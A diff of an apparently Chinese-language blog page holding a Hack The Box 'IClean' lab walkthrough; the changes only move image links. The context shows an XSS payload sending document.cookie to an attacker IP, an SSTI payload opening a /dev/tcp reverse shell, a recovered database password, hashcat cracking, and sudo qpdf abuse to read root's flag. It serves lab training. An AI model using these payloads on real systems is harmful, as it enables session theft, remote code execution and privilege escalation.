@@ -150,9 +150,9 @@ dirsearch">
 <h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u capiclean.htb</span><br><span class="line">/login</span><br><span class="line">/quote</span><br><span class="line">/dashboard	302</span><br></pre></td></tr></table></figure>
 
 <p>capiclean.htb&#x2F;quote</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240730143554120.png" alt="image-20240730143554120"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240730143554120.png" alt="image-20240730143554120"></p>
 <p>抓包，发现请求路径变成了&#x2F;sendMessage</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240730143751635.png" alt="image-20240730143751635"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240730143751635.png" alt="image-20240730143751635"></p>
 <p>对其参数进行测试，最终测试XSS成功</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=fetch(&quot;http://10.10.16.38:8000/&quot;+document.cookie);&gt;</span><br><span class="line"></span><br><span class="line"># urlencode</span><br><span class="line">service=&lt;img+src%3dx+onerror%3dfetch(&quot;http%3a//10.10.16.38:8000/&quot;%2bdocument.cookie)%3b&gt;</span><br><span class="line"></span><br><span class="line"># payload</span><br><span class="line">&lt;img+src%3dx+onerror%3dfetch(&quot;http%3a//10.10.16.38:8000/&quot;%2bdocument.cookie)%3b&gt;&amp;email=aaaaaa%40aa.a</span><br><span class="line"></span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
 
@@ -160,30 +160,30 @@ dirsearch">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqfzSw.KpFwmEyKO76EyEMzWmsW-mWq_XA</span><br></pre></td></tr></table></figure>
 
 <p>添加Cookie，访问&#x2F;dashboard</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240730145735557.png" alt="image-20240730145735557"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240730145735557.png" alt="image-20240730145735557"></p>
 <p>&#x2F;InvoiceGenerator，输入参数后会生成一个<code>Invoice ID generated</code>，对其参数进行测试无果</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240730150118705.png" alt="image-20240730150118705"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240730150118705.png" alt="image-20240730150118705"></p>
 <p>&#x2F;QRGenerator，输入Generate QR后会出现下面的输入框，都对其进行测试</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240731144418899.png" alt="image-20240731144418899"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731144418899.png" alt="image-20240731144418899"></p>
 <h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>qr_link进行测是发现SSTI</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240731144600755.png" alt="image-20240731144600755"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731144600755.png" alt="image-20240731144600755"></p>
 <p>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request|attr(&quot;application&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fbuiltins\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fimport\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;bash+-c+&#x27;/bin/bash+-i+&gt;%26+/dev/tcp/10.10.16.38/4444+0&gt;%261&#x27;&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>app.py，拿到数据库凭据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iclean:pxCsmnGLckUb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240731152220685.png" alt="image-20240731152220685"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731152220685.png" alt="image-20240731152220685"></p>
 <p>不是交互式也可以用 -e参数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uiclean -ppxCsmnGLckUb -e &#x27;show databases;&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>查有bash权限的用户</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240731153010697.png" alt="image-20240731153010697"></p>
-<h3 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h3><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240731152312028.png" alt="image-20240731152312028"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731153010697.png" alt="image-20240731153010697"></p>
+<h3 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h3><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731152312028.png" alt="image-20240731152312028"></p>
 <h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1400 -a 0 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa  /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:simple and clean</span><br></pre></td></tr></table></figure>
 
 <p>ssh就可以连了</p>
-<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240731154158501.png" alt="image-20240731154158501"></p>
+<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731154158501.png" alt="image-20240731154158501"></p>
 <p><a target="_blank" rel="noopener" href="https://qpdf.readthedocs.io/en/stable/cli.htm">https://qpdf.readthedocs.io/en/stable/cli.htm</a></p>
 <p>读flag</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/qpdf --empty /tmp/root.txt --qdf --add-attachment /root/root.txt --</span><br><span class="line"></span><br><span class="line">cat /tmp/root.txt</span><br></pre></td></tr></table></figure>
